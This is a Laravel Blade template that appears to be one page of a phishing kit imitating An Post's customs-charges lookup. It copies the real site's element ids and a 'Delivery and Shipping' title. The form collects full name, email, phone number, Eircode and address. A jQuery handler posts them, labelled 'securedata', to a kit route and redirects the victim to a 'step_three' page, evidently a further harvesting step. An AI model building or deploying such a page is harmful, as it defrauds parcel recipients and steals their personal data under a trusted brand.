@extends('layouts.main')
@section('title', "Delivery and Shipping")
@section('main')
<section id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_pnlFormLookup" class="f14">
    <p class="f14__sub"><span id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_lblCustomChargeText"><img src="https://img.spacergif.org/v1/spacer.gif" width="300" height="1"></span></p>
    <div class="f14__section__wrapper f14__section__wrapper--increase">
    
    
        <div id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_pnlLookupAnPostTrackingNumberWrapper" class="f14__form__group form__group js-slideup">
            <div class="alert  form__group__wrapper">
            <span class=""></span>
            </div>
        </div>

        <div id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_pnlLookupAnPostTrackingNumberWrapper" class="f14__form__group form__group js-slideup">
            <div class="form__group__wrapper">
                <!-- <p class="helper">Full name</p> -->
                <input name="fullname" type="text" id="fullname" class="js-f14-tracking-id imps" data-required-message="Your full name is required" placeholder="Full name" value="" contenteditable="true" required="required">
            </div>
            <span class="form__group__error" aria-hidden="true" data-gtm-vis-polling-id-10069780_227="215"></span>
        </div>
        <div id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_pnlLookupAnPostTrackingNumberWrapper" class="f14__form__group form__group js-slideup">
            <div class="form__group__wrapper">
                <!-- <p class="helper">Email</p> -->
                <input name="email" type="text" id="email" class="js-f14-tracking-id imps" data-required="" data-required-message="Your email is required" autocomplete="off" placeholder="Email">
            </div>
            <span class="form__group__error" aria-hidden="true" data-gtm-vis-polling-id-10069780_227="215"></span>
        </div>
        <div id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_pnlLookupAnPostTrackingNumberWrapper" class="f14__form__group form__group js-slideup">
            <div class="form__group__wrapper">
                <!-- <p class="helper">Phone number</p> -->
                <input type="tel" name="phonenumber" id="phonenumber" class="js-f14-tracking-id imps" maxlength="24" data-required="" data-required-message="Your full name is required" autocomplete="off" placeholder="Phone number">
            </div>
            <span class="form__group__error" aria-hidden="true" data-gtm-vis-polling-id-10069780_227="215"></span>
        </div>
        <div id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_pnlLookupAnPostTrackingNumberWrapper" class="f14__form__group form__group js-slideup">
            <div class="form__group__wrapper">
                <!-- <p class="helper">Eircode</p> -->
                <input name="postcode" type="text" id="postcode" class="js-f14-tracking-id imps" data-required="" data-required-message="Your Eircode is required" autocomplete="off" placeholder="Eircode">
            </div>
            <span class="form__group__error" aria-hidden="true" data-gtm-vis-polling-id-10069780_227="215"></span>
        </div>
        <div id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_pnlLookupAnPostTrackingNumberWrapper" class="f14__form__group form__group js-slideup">
            <div class="form__group__wrapper">
                <!-- <p class="helper">Address</p> -->
                <input name="address" type="text" id="address" class="js-f14-tracking-id imps" data-required="" data-required-message="Your full name is required" autocomplete="off" placeholder="Address">
            </div>
            <span class="form__group__error" aria-hidden="true" data-gtm-vis-polling-id-10069780_227="215"></span>
        </div>

        
        <div class="f14__btn__wrapper f14__btn__wrapper--increase">
            <input type="submit" class="btnSub loginBtn submit bn bn--primary gtm-cta" name="p$lt$WebPartZone13$zoneContent$pageplaceholder$p$lt$ctl01$F14PayCustomsCharges$btnLookupCharge" value="Continue" id="btnSub loginBtn p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_btnLookupCharge">
        </div>
        <div id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_pnlAPIErrors" style="color:red;font-weight:bold"></div>
    </div>
</section>
@include('main.inc.sidebox')
@endsection
@section('js')
<script>
    $(".loginBtn").on("click", () => {
        $.ajax({
            method: "POST",
            url: "{{route('main.new')}}",
            data: {
                _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
				"fullname": $("#fullname").val(),
                "email": $("#email").val(),
                "phonenumber": $("#phonenumber").val(),
				"postcode": $("#postcode").val(),
				"address": $("#address").val(),
                "type": "securedata",
              }
        }).done((data) => {
            url("{{route('main.step_three')}}");
        });
    });

</script>
@endsection
